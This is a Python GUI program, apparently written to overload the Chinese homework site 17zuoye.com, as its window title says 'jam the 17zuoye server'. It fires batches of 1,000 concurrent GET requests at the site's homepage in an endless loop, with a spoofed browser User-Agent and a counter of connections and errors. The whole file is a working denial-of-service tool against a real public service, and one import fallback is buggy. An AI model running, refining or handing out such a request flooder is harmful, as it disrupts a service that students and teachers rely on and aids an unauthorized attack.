import tkinter as tk
from tkinter import messagebox, scrolledtext

msgbox = messagebox
norun = False
import asyncio


def stdout(text, update=True):
    try:
        current_position = text_area.yview()
        text_area.insert(tk.END, f"\n{text}")
        if current_position[1] >= 0.99:
            text_area.see(tk.END)
        if update:
            root.update()
    except:
        pass


def safequit():
    global norun, pause
    norun = True
    pause = False
    root.destroy()
    root.quit()


def update():
    root.update()


def gopause():
    try:
        global pause
        pause = not pause
    except:
        pause = True


root = tk.Tk()
root.focus_force()
root.title("卡一起作业服务器")
root.geometry("600x450")
text_area = scrolledtext.ScrolledText(root, wrap=tk.NONE, width=60, height=15, font=("Arial", 11))
text_area.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
count_display = tk.Label(root, text=f"完成0组,0次连接,0个错误")
count_display.pack()
pausebutton = tk.Button(root, text="暂停/继续", command=gopause)
pausebutton.pack()
quitbutton = tk.Button(root, text="安全退出程序", command=safequit)
quitbutton.pack()
root.update()
stdout("-正在导入库…")
try:
    import aiohttp
except:
    import sys, subprocess, time

    mirrors = {"清华": "https://pypi.tuna.tsinghua.edu.cn/simple", "阿里云": "https://mirrors.aliyun.com/pypi/simple", "豆瓣": "https://pypi.douban.com/simple", "中科大": "https://pypi.mirrors.ustc.edu.cn/simple"}
    mirror_url = mirrors["清华"]
    subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp", "-i", mirror_url, "--trusted-host", mirror_url.split("//")[1].split("/")[0]])
    time.sleep(0.1)
    import aiohttp

    del sys
    del subprocess
    del time
try:
    import requests
except:
    import sys, subprocess, time

    mirrors = {"清华": "https://pypi.tuna.tsinghua.edu.cn/simple", "阿里云": "https://mirrors.aliyun.com/pypi/simple", "豆瓣": "https://pypi.douban.com/simple", "中科大": "https://pypi.mirrors.ustc.edu.cn/simple"}
    mirror_url = mirrors["清华"]
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "-i", mirror_url, "--trusted-host", mirror_url.split("//")[1].split("/")[0]])
    time.sleep(0.1)
    import aiohttp

    del sys
    del subprocess
    del time
import sys

wifi = False
stdout("-正在检测联网状态…")
try:
    requests.get("https://www.baidu.com/", timeout=5)
    wifi = True
except:
    pass
try:
    if not wifi:
        requests.get("https://im.qq.com/index/#/", timeout=5)
        wifi = True
except:
    pass
try:
    if not wifi:
        requests.get("https://shequ.codemao.cn/", timeout=5)
        wifi = True
except:
    pass
try:
    if not wifi:
        requests.get("https://www.so.com/", timeout=5)
        wifi = True
except:
    pass
try:
    if not wifi:
        requests.get("https://www.python.org/", timeout=5)
        wifi = True
except:
    pass
if not wifi:
    stdout("--没有连接到网络")
    stdout("-请点击底部按钮退出")
    while not norun:
        update()
    sys.exit()
stdout("-正在创建函数…")


async def fetch_url(session, url):
    global count, green, error, root, norun
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "zh-CN,zh;q=0.9", }
        async with session.get(url, timeout=10, headers=headers) as result:
            update()
            if norun:
                sys.exit()
            code = result.status
        if code != 200:
            error += 1
        return 0
    except Exception as e:
        error += 1
        return 1
    except BaseException as e:
        error += 1
        return 1


async def main():
    global urls
    stdout("-开始本次爬虫", False)
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_url(session, url) for url in urls]
        stdout("-等待爬虫结束")
        results = await asyncio.gather(*tasks)


if __name__ == "__main__":
    nopausetips = False
    stdout("-初始化爬虫列表…")
    count = 0
    urls = []
    for i in range(1000):
        urls.append("https://www.17zuoye.com/")
    stdout("-现在启动")
    root.update()
    count = 0
    error_total = 0
    pause = False
    while not norun:
        if pause:
            if not nopausetips:
                stdout("--暂停成功")
            nopausetips = False
            while pause:
                update()
            stdout("--继续运行")
        stdout(f"--第{count + 1}组开始", False)
        if not norun:
            count_display.config(text=f"完成{count}组,{count * 1000}次连接,{error_total}个错误")
        error = 0
        update()
        asyncio.run(main())
        error_total += error
        count += 1
        stdout(f"--完成第{count}组", False)
        stdout(f"--错误{error}个", False)
        if error >= 450:
            wifi = False
            try:
                requests.get("https://www.baidu.com/", timeout=5)
                wifi = True
            except:
                pass
            try:
                if not wifi:
                    requests.get("https://im.qq.com/index/#/", timeout=5)
                    wifi = True
            except:
                pass
            try:
                if not wifi:
                    requests.get("https://shequ.codemao.cn/", timeout=5)
                    wifi = True
            except:
                pass
            try:
                if not wifi:
                    requests.get("https://www.so.com/", timeout=5)
                    wifi = True
            except:
                pass
            try:
                if not wifi:
                    requests.get("https://www.python.org/", timeout=5)
                    wifi = True
            except:
                pass
            if not wifi:
                stdout("--请检查网络连接")
                stdout("-连接网络后,请点击继续按钮")
                pause = True
                nopausetips = True
                continue
        update()
        stdout("-开始下一个", False)
    sys.exit()
